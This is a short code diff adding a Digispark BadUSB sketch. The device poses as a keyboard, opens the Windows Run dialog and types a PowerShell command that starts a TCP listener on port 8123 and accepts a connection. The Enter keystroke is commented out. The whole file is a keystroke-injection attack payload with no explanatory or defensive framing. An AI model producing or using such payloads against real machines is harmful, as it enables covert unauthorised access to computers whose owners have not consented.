@@ -1,0 +1,15 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell.exe -Command \"$listener = [System.Net.Sockets.TcpListener]8123;$listener.Start();$listener.AcceptTcpClient();\"");
+  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
+} 
+
+void loop() {
+
+}
